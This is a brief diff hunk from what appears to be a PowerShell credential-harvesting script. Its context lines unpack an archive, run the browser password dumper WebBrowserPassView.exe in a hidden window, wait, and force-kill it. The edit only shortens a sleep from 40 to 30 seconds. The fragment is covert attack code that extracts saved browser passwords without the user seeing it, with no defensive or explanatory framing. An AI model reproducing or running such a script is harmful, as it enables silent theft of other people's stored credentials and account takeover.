@@ -10,7 +10,7 @@ Expand-Archive 7z.zip
 Start-Sleep -Seconds 5
 Start-Process -FilePath .\WebBrowserPassView.exe -Wait -WindowStyle Hidden
 
-Start-Sleep -Seconds 40
+Start-Sleep -Seconds 30
 
 Stop-Process -Name "WebBrowserPassView" -Force
 
